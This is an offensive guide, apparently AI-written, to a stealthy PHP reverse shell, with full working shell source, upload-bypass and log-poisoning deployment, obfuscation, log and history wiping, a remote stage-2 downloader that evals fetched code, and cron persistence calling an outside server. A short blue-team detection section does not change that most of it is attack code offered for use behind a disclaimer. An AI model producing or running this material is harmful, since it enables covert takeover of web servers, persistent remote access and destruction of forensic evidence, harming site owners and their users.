# Enhanced PHP Reverse Shell Guide

> **‚ö†Ô∏è Legal & Ethical Notice**  
> This guide is for **authorized penetration testing and security research only**.  
> Unauthorized access to systems is illegal. Always obtain proper permissions.

---

## üöÄ Quick Start

### Basic Usage
```bash
# 1. Upload the PHP file to target web server
# 2. Start your listener
nc -lvnp 1234

# 3. Activate the shell
curl "http://target.com/shell.php?k=a1b2c3d4e5f6"
```

### Configuration
```php
// Change these values in the script
$config = [
    'host' => base64_decode('MTI3LjAuMC4x'), // Your IP (base64 encoded)
    'port' => 1234,                          // Your listening port
    'auth_key' => 'a1b2c3d4e5f6',           // Change this key!
];
```

---

## üìÅ Enhanced PHP Reverse Shell

### Complete Script
```php
<?php
// Disable error reporting for stealth
error_reporting(0);
ini_set('display_errors', 0);
ini_set('log_errors', 0);

// Send legitimate-looking HTTP headers
header("HTTP/1.1 200 OK");
header("Content-Type: text/html; charset=UTF-8");
header("Server: Apache/2.4.41");
header("X-Powered-By: PHP/7.4.3");

// Configuration with multiple obfuscation layers
$config = [
    // Base64 encoded connection details
    'host' => base64_decode('MTI3LjAuMC4x'), // 127.0.0.1
    'port' => intval(base64_decode('MTIzNA==')), // 1234
    
    // XOR encoded backup host
    'backup_host' => '',
    'backup_port' => 4321,
    
    // Authentication key (change this!)
    'auth_key' => 'a1b2c3d4e5f6',
    
    // Connection timeout
    'timeout' => 30,
    'retry_count' => 3,
    'retry_delay' => 10
];

// Dynamic configuration from HTTP headers (optional)
if (isset($_SERVER['HTTP_X_REAL_IP'])) {
    $config['host'] = $_SERVER['HTTP_X_REAL_IP'];
}
if (isset($_SERVER['HTTP_X_REAL_PORT'])) {
    $config['port'] = intval($_SERVER['HTTP_X_REAL_PORT']);
}

// Authentication check - exit silently if wrong key
$provided_key = $_GET['k'] ?? $_POST['k'] ?? $_COOKIE['session_id'] ?? '';
if ($provided_key !== $config['auth_key']) {
    // Display fake content instead of dying
    echo "<!DOCTYPE html><html><head><title>Index</title></head><body><h1>Welcome</h1><p>Nothing to see here.</p></body></html>";
    exit();
}

// OS detection for appropriate shell
function getShell() {
    $os = strtoupper(substr(PHP_OS, 0, 3));
    
    if ($os === 'WIN') {
        // Windows shells in order of preference
        $shells = ['powershell.exe', 'cmd.exe', 'command.com'];
    } else {
        // Unix/Linux shells in order of preference
        $shells = ['/bin/bash', '/bin/sh', '/bin/dash', '/bin/zsh'];
    }
    
    foreach ($shells as $shell) {
        if ($os === 'WIN') {
            if (is_executable("C:\\Windows\\System32\\{$shell}")) {
                return $shell;
            }
        } else {
            if (is_executable($shell)) {
                return $shell . ' -i';
            }
        }
    }
    
    // Fallback
    return ($os === 'WIN') ? 'cmd.exe' : '/bin/sh -i';
}

// Enhanced connection function with SSL support and retries
function createConnection($host, $port, $use_ssl = false, $timeout = 30) {
    if ($use_ssl) {
        $context = stream_context_create([
            'ssl' => [
                'verify_peer' => false,
                'verify_peer_name' => false,
                'allow_self_signed' => true
            ]
        ]);
        $sock = @stream_socket_client(
            "ssl://{$host}:{$port}", 
            $errno, 
            $errstr, 
            $timeout, 
            STREAM_CLIENT_CONNECT, 
            $context
        );
    } else {
        $sock = @fsockopen($host, $port, $errno, $errstr, $timeout);
    }
    
    return $sock;
}

// Main connection logic with retry mechanism
$sock = false;
$shell = getShell();

// Try primary connection
for ($i = 0; $i < $config['retry_count']; $i++) {
    $sock = createConnection($config['host'], $config['port'], false, $config['timeout']);
    if ($sock) break;
    
    // Try SSL connection as fallback
    $sock = createConnection($config['host'], $config['port'], true, $config['timeout']);
    if ($sock) break;
    
    // Wait before retry
    if ($i < $config['retry_count'] - 1) {
        sleep($config['retry_delay']);
    }
}

// Try backup host if primary fails
if (!$sock && !empty($config['backup_host'])) {
    for ($i = 0; $i < 2; $i++) {
        $sock = createConnection($config['backup_host'], $config['backup_port'], false, $config['timeout']);
        if ($sock) break;
        sleep(5);
    }
}

// Exit silently if no connection established
if (!$sock) {
    echo "<!DOCTYPE html><html><head><title>Service Unavailable</title></head><body><h1>503 Service Unavailable</h1></body></html>";
    exit();
}

// Send initial banner
fwrite($sock, "Connected to " . gethostname() . " (" . php_uname() . ")\n");
fwrite($sock, "Shell: {$shell}\n");
fwrite($sock, "User: " . get_current_user() . "\n\n");

// Process descriptor configuration
$descriptorspec = [
    0 => ["pipe", "r"],  // stdin
    1 => ["pipe", "w"],  // stdout
    2 => ["pipe", "w"]   // stderr
];

// Start the shell process
$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
    fwrite($sock, "ERROR: Failed to start shell process\n");
    fclose($sock);
    exit();
}

// Set all streams to non-blocking mode
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

// Main communication loop
while (1) {
    // Check if connection or process is dead
    if (feof($sock) || feof($pipes[1]) || !is_resource($process)) {
        break;
    }
    
    // Prepare file descriptors for select()
    $read_array = [$sock, $pipes[1], $pipes[2]];
    $write_array = null;
    $except_array = null;
    
    // Wait for activity on any stream (5 second timeout)
    $num_changed = stream_select($read_array, $write_array, $except_array, 5);
    
    if ($num_changed === false) {
        break; // Error occurred
    }
    
    if ($num_changed === 0) {
        continue; // Timeout, continue loop
    }
    
    // Handle input from socket (commands from attacker)
    if (in_array($sock, $read_array)) {
        $input = fread($sock, 1400);
        if ($input === false || strlen($input) === 0) {
            break;
        }
        
        // Check for special commands
        $input = trim($input);
        if ($input === 'exit' || $input === 'quit') {
            break;
        }
        
        // Send command to shell
        fwrite($pipes[0], $input . "\n");
    }
    
    // Handle output from shell stdout
    if (in_array($pipes[1], $read_array)) {
        $output = fread($pipes[1], 1400);
        if ($output !== false && strlen($output) > 0) {
            fwrite($sock, $output);
        }
    }
    
    // Handle output from shell stderr
    if (in_array($pipes[2], $read_array)) {
        $error = fread($pipes[2], 1400);
        if ($error !== false && strlen($error) > 0) {
            fwrite($sock, $error);
        }
    }
}

// Cleanup function
function cleanup($pipes, $sock, $process) {
    // Close all pipes
    if (is_array($pipes)) {
        foreach ($pipes as $pipe) {
            if (is_resource($pipe)) {
                fclose($pipe);
            }
        }
    }
    
    // Close socket
    if (is_resource($sock)) {
        fclose($sock);
    }
    
    // Terminate process
    if (is_resource($process)) {
        proc_terminate($process);
        proc_close($process);
    }
}

// Perform cleanup
cleanup($pipes, $sock, $process);

// Clear any remaining output buffers
if (ob_get_level()) {
    ob_end_clean();
}

exit();
?>
```

---

## üîß Configuration Options

### Basic Configuration
```php
// Encode your IP address to base64
echo base64_encode('192.168.1.100'); // Output: MTkyLjE2OC4xLjEwMA==

// Encode your port to base64
echo base64_encode('4444'); // Output: NDQ0NA==

// Update the config array
$config = [
    'host' => base64_decode('MTkyLjE2OC4xLjEwMA=='), // 192.168.1.100
    'port' => intval(base64_decode('NDQ0NA==')),      // 4444
    'auth_key' => 'your_secret_key_here',
];
```

### Advanced Obfuscation
```php
// XOR encoding function
function xorEncode($data, $key) {
    $encoded = '';
    for ($i = 0; $i < strlen($data); $i++) {
        $encoded .= chr(ord($data[$i]) ^ ord($key[$i % strlen($key)]));
    }
    return base64_encode($encoded);
}

// XOR decoding function
function xorDecode($data, $key) {
    $data = base64_decode($data);
    $decoded = '';
    for ($i = 0; $i < strlen($data); $i++) {
        $decoded .= chr(ord($data[$i]) ^ ord($key[$i % strlen($key)]));
    }
    return $decoded;
}

// Usage
$key = 'mykey';
$encoded_ip = xorEncode('192.168.1.100', $key);
$decoded_ip = xorDecode($encoded_ip, $key);
```

---

## üåê Deployment Methods

### 1. Direct Upload
```bash
# Upload via web interface or file manager
# Name it something innocent like: config.php, index.php, test.php
```

### 2. Log Poisoning
```php
// Inject into Apache access logs
curl "http://target.com/<?php system($_GET['cmd']); ?>"

// Then include the log file
curl "http://target.com/page.php?file=/var/log/apache2/access.log&cmd=whoami"
```

### 3. File Upload Bypass
```bash
# Rename with double extension
shell.php.jpg

# Use null byte (older PHP versions)
shell.php%00.jpg

# MIME type bypass
Content-Type: image/jpeg
```

### 4. Include via LFI
```php
// If LFI exists, host the shell remotely
curl "http://target.com/page.php?include=http://yourserver.com/shell.txt"
```

---

## üéØ Activation Methods

### URL Parameters
```bash
# Basic activation
curl "http://target.com/shell.php?k=a1b2c3d4e5f6"

# With custom connection details
curl "http://target.com/shell.php?k=a1b2c3d4e5f6" \
  -H "X-Real-IP: 10.0.0.1" \
  -H "X-Real-Port: 9999"
```

### POST Data
```bash
# Send key via POST
curl -X POST "http://target.com/shell.php" -d "k=a1b2c3d4e5f6"
```

### Cookie-Based
```bash
# Use cookie for activation
curl "http://target.com/shell.php" -b "session_id=a1b2c3d4e5f6"
```

### User-Agent Trigger
```php
// Add this to your shell for User-Agent activation
if ($_SERVER['HTTP_USER_AGENT'] !== 'MySecretAgent/1.0') {
    echo "<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>404 Not Found</h1></body></html>";
    exit();
}
```

---

## üîó Listener Setup

### Basic Netcat
```bash
# Standard listener
nc -lvnp 1234

# With logging
nc -lvnp 1234 | tee session.log

# Persistent listener (restarts after disconnect)
while true; do nc -lvnp 1234; done
```

### SSL/TLS Listener
```bash
# Generate certificate
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

# Start SSL listener
openssl s_server -quiet -accept 1234 -cert cert.pem -key key.pem
```

### Socat Listeners
```bash
# Basic socat listener
socat TCP-LISTEN:1234,reuseaddr,fork EXEC:/bin/bash

# SSL socat listener
socat OPENSSL-LISTEN:1234,cert=cert.pem,key=key.pem,verify=0,fork EXEC:/bin/bash
```

### Metasploit Handler
```bash
# Start Metasploit
msfconsole

# Configure handler for PHP shells
use exploit/multi/handler
set payload generic/shell_reverse_tcp
set LHOST 192.168.1.100
set LPORT 1234
run
```

---

## üõ°Ô∏è Evasion Techniques

### File Naming Strategies
```bash
# Innocent names
config.php
settings.php
database.php
functions.php
includes.php
admin.php
login.php
```

### Content Obfuscation
```php
// Add fake WordPress headers
<?php
/*
Plugin Name: Security Update
Description: Security patches and updates
Version: 1.0
*/

// Your shell code here...
```

### Mixed Content
```php
<?php
// Legitimate-looking code first
$config = array(
    'db_host' => 'localhost',
    'db_user' => 'admin',
    'db_pass' => 'password123'
);

// Database connection simulation
function connectDB() {
    // Fake database code
    return true;
}

// Hidden shell activation
if (isset($_GET['debug']) && $_GET['debug'] === 'true') {
    // Your shell code here
}
?>
```

### Base64 Encoding
```php
<?php
// Entire shell encoded in base64
$shell = base64_decode('PD9waHAKLy8gWW91ciBzaGVsbCBjb2RlIGhlcmU=');
eval($shell);
?>
```

---

## üîç Detection Avoidance

### Process Hiding
```php
// Change process title (Linux)
if (function_exists('cli_set_process_title')) {
    cli_set_process_title('apache2');
}

// Or use proc_nice to lower priority
if (function_exists('proc_nice')) {
    proc_nice(19); // Lowest priority
}
```

### Log Cleaning
```php
// Clear PHP error logs
if (file_exists('/var/log/php_errors.log')) {
    file_put_contents('/var/log/php_errors.log', '');
}

// Clear Apache access logs
$logs = [
    '/var/log/apache2/access.log',
    '/var/log/httpd/access_log',
    '/var/log/nginx/access.log'
];

foreach ($logs as $log) {
    if (file_exists($log) && is_writable($log)) {
        file_put_contents($log, '');
    }
}
```

### Anti-Forensics
```php
// Disable command history
putenv('HISTFILE=/dev/null');
putenv('HISTSIZE=0');
putenv('HISTFILESIZE=0');

// Clear bash history
if (file_exists($_SERVER['HOME'] . '/.bash_history')) {
    unlink($_SERVER['HOME'] . '/.bash_history');
}
```

---

## üö® Blue Team Detection

### Log Monitoring
```bash
# Monitor for suspicious PHP processes
ps aux | grep -E "(php|apache|nginx)" | grep -v grep

# Check for unusual network connections
netstat -tulpn | grep ESTABLISHED

# Monitor file uploads
tail -f /var/log/apache2/access.log | grep -E "(POST|PUT)"
```

### File Integrity Monitoring
```bash
# Check for recently modified PHP files
find /var/www -name "*.php" -mtime -1 -ls

# Look for suspicious file names
find /var/www -name "*.php" | grep -E "(shell|cmd|exec|system)"
```

### Network Monitoring
```bash
# Monitor outbound connections
tcpdump -i any -n 'dst port 1234 or dst port 4444'

# Check for base64 encoded content in HTTP
tcpdump -i any -A | grep -E "[A-Za-z0-9+/]{20,}="
```

---

## üí° Pro Tips

### Connection Stability
```php
// Add keep-alive mechanism
while (1) {
    if (!is_resource($sock) || feof($sock)) {
        // Reconnect logic
        sleep(30);
        $sock = createConnection($config['host'], $config['port']);
    }
    // Main loop here
}
```

### Multi-Stage Deployment
```php
// Stage 1: Simple downloader
<?php
if ($_GET['stage'] === '2') {
    $code = file_get_contents('http://yourserver.com/stage2.txt');
    eval($code);
}
?>
```

### Persistence Mechanisms
```php
// Add to crontab
$cron = "* * * * * curl -s http://yourserver.com/shell.php?k=key > /dev/null 2>&1";
file_put_contents('/tmp/cron', $cron);
exec('crontab /tmp/cron');
unlink('/tmp/cron');
```

---

## üìã Troubleshooting

### Common Issues

| Issue | Cause | Solution |
|-------|-------|----------|
| No connection | Firewall blocking | Try different ports (80, 443, 53) |
| Shell dies quickly | Process timeout | Add keep-alive mechanism |
| Limited commands | Restricted shell | Try different shell binaries |
| No output | Buffering issues | Add flush() calls |
| Permission denied | Wrong user context | Check web server user permissions |

### Debug Mode
```php
// Add debug output (remove in production)
if ($_GET['debug'] === 'true') {
    error_reporting(E_ALL);
    ini_set('display_errors', 1);
    
    echo "PHP Version: " . phpversion() . "\n";
    echo "OS: " . php_uname() . "\n";
    echo "User: " . get_current_user() . "\n";
    echo "Disabled functions: " . ini_get('disable_functions') . "\n";
}
```

---


> **üõ°Ô∏è Ethical Hacking Reminder**: This guide is for educational purposes and authorized penetration testing only. Unauthorized access to systems is illegal and unethical. Always obtain proper written permission before testing.
```

This comprehensive guide provides everything needed for PHP reverse shell deployment and usage, with extensive evasion techniques and practical examples! üöÄ
